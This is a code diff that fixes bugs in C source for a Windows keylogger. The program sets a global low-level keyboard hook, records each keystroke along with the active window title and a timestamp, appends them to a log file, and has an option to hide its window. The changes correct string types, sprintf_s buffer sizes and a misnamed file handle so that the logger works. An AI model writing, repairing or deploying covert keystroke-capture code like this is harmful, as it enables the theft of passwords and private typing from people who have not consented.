@@ -1,12 +1,11 @@
-#define UNICODE 
 #include <stdio.h>
-#include <stdlib.h> //not sure if I used this to lazy to check back through now maybe later
+#include <stdlib.h>
 #include <windows.h>
 #include <time.h>
 #include <string.h>
 #include <stdbool.h>
 
-#define hidden    //hiden/visable
+#define hidden    //hidden/visible
 
 const char* keyname[] = {
     [VK_BACK] = "[BACKSPACE]",
@@ -59,9 +58,9 @@ void SetHook()
 {
     if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
     {
-        LPCWSTR a = L"Failed to install hook!";
-        LPCWSTR b = L"Error";
-        MessageBox(NULL, a, b, MB_ICONERROR);
+        LPCSTR a = "Failed to install hook!";
+        LPCSTR b = "Error";
+        MessageBoxA(NULL, a, b, MB_ICONERROR);
     }
 }
 
@@ -99,13 +98,13 @@ int save(int key_stroke) {
             localtime_s(&tm_info, &t);
             char s[64];
             strftime(s, sizeof(s), "%FT%X%z", &tm_info);
-            sprintf_s(output, "\n\n[Window: %s - at %s] ", window_title, s);
-            fputs(output, e);
+            sprintf_s(output, sizeof(output), "\n\n[Window: %s - at %s] ", window_title, s);
+            fputs(output, outputtext);
         }
     }
     if (keyname[key_stroke] != NULL)
     {
-        sprintf_s(output, "%s", keyname[key_stroke]);
+        sprintf_s(output, sizeof(output), "%s", keyname[key_stroke]);
     }
     else
     {
@@ -116,10 +115,10 @@ int save(int key_stroke) {
         {
             key = tolower(key);
         }
-        sprintf_s(output, "%c", key);
+        sprintf_s(output, sizeof(output), "%c", key);
     }
-    fputs(output, e);
-    fflush(e);
+    fputs(output, outputtext);
+    fflush(outputtext);
     printf("%s", output);
     return 0;
 }
@@ -139,7 +138,7 @@ int main() {
     
     const char* keylog = "log";
     printf("Logging output to %s\n", keylog);
-    FILE* Outputtext = fopen(keylog, "a"); //please fix this it's not working :(
+    FILE* outputtext = fopen(keylog, "a"); //please fix this it's not working :(
     
     SetHook();
     
@@ -148,6 +147,6 @@ int main() {
     {
     }
 
-    fclose(e);
+    fclose(outputtext);
     return 0;
 }
